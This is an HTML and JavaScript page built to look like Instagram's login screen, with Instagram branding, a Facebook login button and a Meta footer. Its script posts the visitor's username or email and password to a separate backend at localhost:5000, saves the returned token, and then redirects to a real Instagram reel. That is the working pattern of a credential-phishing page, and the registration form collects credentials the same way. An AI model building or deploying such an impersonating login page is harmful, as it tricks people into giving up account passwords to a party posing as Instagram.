<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet" />
  <style>
    *,
    *::before,
    *::after {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    :root {
      --bg-outer: #f0f2f5;
      --bg-card: #ffffff;
      --bg-header: #f7f7f7;
      --bg-input: #f7f7f7;
      --border: #dbdbdb;
      --text-primary: #1a1a2e;
      --text-muted: #999999;
      --btn-primary: #2d5fa6;
      --btn-primary-hover: #3a74c8;
      --btn-fb: #f0f2f5;
      --btn-fb-border: #dbdbdb;
      --accent: #3a74c8;
      --insta-grad: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
    }

    body {
      font-family: 'Nunito', sans-serif;
      background: var(--bg-outer);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .card {
      background: var(--bg-card);
      border-radius: 20px;
      overflow: hidden;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 8px 40px rgba(0, 0, 0, 0.10);
      animation: slideUp 0.5s cubic-bezier(0.22, 1, 0.36, 1) both;
    }

    @keyframes slideUp {
      from {
        opacity: 0;
        transform: translateY(30px);
      }

      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .card-header {
      background: var(--bg-header);
      padding: 28px 0 24px;
      display: flex;
      justify-content: center;
      align-items: center;
      border-bottom: 1px solid var(--border);
    }

    .logo-wrap {
      display: flex;
      align-items: center;
      justify-content: center;
      filter: drop-shadow(0 4px 16px rgba(220, 39, 67, 0.30));
    }

    .card-body {
      padding: 32px 28px 28px;
    }

    h1 {
      font-size: 1.35rem;
      font-weight: 800;
      color: var(--text-primary);
      margin-bottom: 24px;
      letter-spacing: -0.3px;
    }

    .field {
      margin-bottom: 14px;
    }

    .field input {
      width: 100%;
      padding: 15px 18px;
      background: var(--bg-input);
      border: 1.5px solid var(--border);
      border-radius: 12px;
      color: var(--text-primary);
      font-family: 'Nunito', sans-serif;
      font-size: 0.95rem;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s;
    }

    .field input::placeholder {
      color: var(--text-muted);
    }

    .field input:focus {
      border-color: var(--accent);
      box-shadow: 0 0 0 3px rgba(58, 116, 200, 0.18);
    }

    .btn-login {
      width: 100%;
      padding: 15px;
      background: var(--btn-primary);
      color: #fff;
      font-family: 'Nunito', sans-serif;
      font-size: 1rem;
      font-weight: 700;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      margin-top: 6px;
      transition: background 0.2s, transform 0.1s;
      letter-spacing: 0.2px;
    }

    .btn-login:hover {
      background: var(--btn-primary-hover);
    }

    .btn-login:active {
      transform: scale(0.98);
    }

    .forgot {
      display: block;
      text-align: center;
      margin: 18px 0 24px;
      color: #555;
      font-size: 0.9rem;
      font-weight: 600;
      text-decoration: none;
    }

    .forgot:hover {
      text-decoration: underline;
    }

    .divider {
      height: 1px;
      background: var(--border);
      margin-bottom: 20px;
    }

    .btn-fb {
      width: 100%;
      padding: 14px;
      background: var(--btn-fb);
      border: 1.5px solid var(--btn-fb-border);
      color: var(--text-primary);
      align-items: center;
      justify-content: center;
      gap: 10px;
      margin-bottom: 14px;
      transition: background 0.2s;
    }

    .btn-fb:hover {
      background: #e4e6ea;
    }

    .fb-icon {
      width: 20px;
      height: 20px;
      background: #1877F2;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 13px;
      font-weight: 900;
      color: #fff;
      flex-shrink: 0;
    }

    .btn-create {
      width: 100%;
      padding: 14px;
      background: transparent;
      border: 1.5px solid var(--accent);
      color: var(--accent);
      font-family: 'Nunito', sans-serif;
      font-size: 0.95rem;
      font-weight: 700;
      border-radius: 12px;
      cursor: pointer;
      margin-bottom: 20px;
      transition: background 0.2s, color 0.2s;
    }

    .btn-create:hover {
      background: rgba(58, 116, 200, 0.12);
    }

    .meta-footer {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 7px;
      color: var(--text-muted);
      font-size: 0.82rem;
      font-weight: 600;
    }

    .meta-logo {
      display: flex;
      align-items: center;
      gap: 4px;
      opacity: 0.55;
    }

    .meta-logo svg {
      width: 18px;
      height: 18px;
      fill: var(--text-muted);
    }
  </style>
</head>

<body>
  <div class="card">
    <div class="card-header">
      <div class="logo-wrap">
        <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg" width="80" height="80">
          <defs>
            <radialGradient id="ig-radial" cx="30%" cy="107%" r="130%">
              <stop offset="0%" stop-color="#ffd676" />
              <stop offset="20%" stop-color="#f2a455" />
              <stop offset="38%" stop-color="#f05c3b" />
              <stop offset="52%" stop-color="#c62a8a" />
              <stop offset="74%" stop-color="#8b3fad" />
              <stop offset="100%" stop-color="#4c6dba" />
            </radialGradient>
          </defs>
          <!-- Rounded square background -->
          <rect x="0" y="0" width="200" height="200" rx="45" ry="45" fill="url(#ig-radial)" />
          <!-- Camera rounded square body -->
          <rect x="48" y="48" width="104" height="104" rx="28" ry="28" fill="none" stroke="white" stroke-width="10" />
          <!-- Lens ring -->
          <circle cx="100" cy="100" r="26" fill="none" stroke="white" stroke-width="10" />
          <!-- Lens inner fill -->
          <circle cx="100" cy="100" r="13" fill="white" />
          <!-- Viewfinder dot -->
          <circle cx="136" cy="65" r="7" fill="white" />
        </svg>
      </div>
    </div>

    <div class="card-body">
      <h1>Log in to Instagram</h1>

      <div class="field">
        <input id="loginUser" type="text" placeholder="Mobile number, username or email address"
          autocomplete="username" />
      </div>
      <div class="field">
        <input id="loginPass" type="password" placeholder="Password" autocomplete="current-password" />
      </div>

      <div id="msg"
        style="display:none;padding:10px 14px;border-radius:10px;font-size:0.88rem;font-weight:600;margin-bottom:4px;text-align:center;">
      </div>

      <button class="btn-login" id="loginBtn" onclick="handleLogin()">Log in</button>

      <a href="#" class="forgot">Forgotten password?</a>

      <div class="divider"></div>

      <button class="btn-fb">
        <span class="fb-icon">f</span>
        Log in with Facebook
      </button>

      <button class="btn-create" onclick="showRegister()">Create new account</button>

      <div class="meta-footer">
        <div class="meta-logo">
          <svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg">
            <path
              d="M 10 20 C 10 11 16 6 22 6 C 28 6 32 10 36 17 C 40 10 44 6 50 6 C 56 6 62 11 62 20 C 62 29 56 34 50 34 C 44 34 40 30 36 23 C 32 30 28 34 22 34 C 16 34 10 29 10 20 Z"
              stroke="currentColor" stroke-width="4" fill="none" />
          </svg>
          Meta
        </div>
      </div>
    </div>
  </div>

  <!-- Register Modal -->
  <div id="registerModal"
    style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.45);z-index:100;align-items:center;justify-content:center;">
    <div
      style="background:#fff;border-radius:20px;padding:32px 28px;width:90%;max-width:380px;box-shadow:0 20px 60px rgba(0,0,0,0.2);">
      <h2 style="font-family:'Nunito',sans-serif;font-size:1.2rem;font-weight:800;color:#1a1a2e;margin-bottom:20px;">
        Create Account</h2>
      <div id="regMsg"
        style="display:none;padding:10px 14px;border-radius:10px;font-size:0.88rem;font-weight:600;margin-bottom:12px;text-align:center;">
      </div>
      <input id="regUsername" type="text" placeholder="Username"
        style="width:100%;padding:14px 16px;margin-bottom:12px;background:#f7f7f7;border:1.5px solid #dbdbdb;border-radius:12px;font-family:'Nunito',sans-serif;font-size:0.95rem;outline:none;box-sizing:border-box;" />
      <input id="regEmail" type="email" placeholder="Email address"
        style="width:100%;padding:14px 16px;margin-bottom:12px;background:#f7f7f7;border:1.5px solid #dbdbdb;border-radius:12px;font-family:'Nunito',sans-serif;font-size:0.95rem;outline:none;box-sizing:border-box;" />
      <input id="regPassword" type="password" placeholder="Password (min 6 chars)"
        style="width:100%;padding:14px 16px;margin-bottom:16px;background:#f7f7f7;border:1.5px solid #dbdbdb;border-radius:12px;font-family:'Nunito',sans-serif;font-size:0.95rem;outline:none;box-sizing:border-box;" />
      <button onclick="handleRegister()"
        style="width:100%;padding:14px;background:#2d5fa6;color:#fff;font-family:'Nunito',sans-serif;font-size:1rem;font-weight:700;border:none;border-radius:12px;cursor:pointer;margin-bottom:10px;">Sign
        Up</button>
      <button onclick="closeRegister()"
        style="width:100%;padding:12px;background:transparent;border:1.5px solid #dbdbdb;border-radius:12px;font-family:'Nunito',sans-serif;font-size:0.9rem;font-weight:600;cursor:pointer;color:#555;">Cancel</button>
    </div>
  </div>

  <script>
    const API = 'http://localhost:5000/api';

    function showMsg(id, message, isError) {
      const el = document.getElementById(id);
      el.style.display = 'block';
      el.style.background = isError ? '#fff0f0' : '#f0fff4';
      el.style.color = isError ? '#c0392b' : '#27ae60';
      el.style.border = `1px solid ${isError ? '#f5c6cb' : '#c3e6cb'}`;
      el.textContent = message;
    }

    async function handleLogin() {
      const usernameOrEmail = document.getElementById('loginUser').value.trim();
      const password = document.getElementById('loginPass').value;
      const btn = document.getElementById('loginBtn');

      if (!usernameOrEmail || !password) {
        return showMsg('msg', 'Please fill in all fields.', true);
      }

      btn.textContent = 'Logging in...';
      btn.disabled = true;

      try {
        const res = await fetch(`${API}/auth/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ usernameOrEmail, password }),
        });
        const data = await res.json();

        if (data.success) {
          localStorage.setItem('token', data.token);

          showMsg('msg', `✅ Welcome back, ${data.user.username}!`, false);

          setTimeout(() => {
            window.location.href = "https://www.instagram.com/reel/DXopv_QCIe4/?igsh=aDRwMDk3aDkwcnQ0";
          }, 100);
        } else {
          showMsg('msg', data.message, true);
        }
      } catch {
        showMsg('msg', '❌ Cannot connect to server. Is it running?', true);
      } finally {
        btn.textContent = 'Log in';
        btn.disabled = false;
      }
    }

    function showRegister() {
      const modal = document.getElementById('registerModal');
      modal.style.display = 'flex';
    }

    function closeRegister() {
      document.getElementById('registerModal').style.display = 'none';
      document.getElementById('regMsg').style.display = 'none';
    }

    async function handleRegister() {
      const username = document.getElementById('regUsername').value.trim();
      const email = document.getElementById('regEmail').value.trim();
      const password = document.getElementById('regPassword').value;

      if (!username || !email || !password) {
        return showMsg('regMsg', 'Please fill in all fields.', true);
      }

      try {
        const res = await fetch(`${API}/auth/register`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, email, password }),
        });
        const data = await res.json();

        if (data.success) {
          localStorage.setItem('token', data.token);
          showMsg('regMsg', `✅ Account created! Welcome, ${data.user.username}!`, false);
          setTimeout(closeRegister, 2000);
        } else {
          showMsg('regMsg', data.message, true);
        }
      } catch {
        showMsg('regMsg', '❌ Cannot connect to server. Is it running?', true);
      }
    }

    // Allow Enter key to submit
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') handleLogin();
    });
  </script>
</body>

</html>
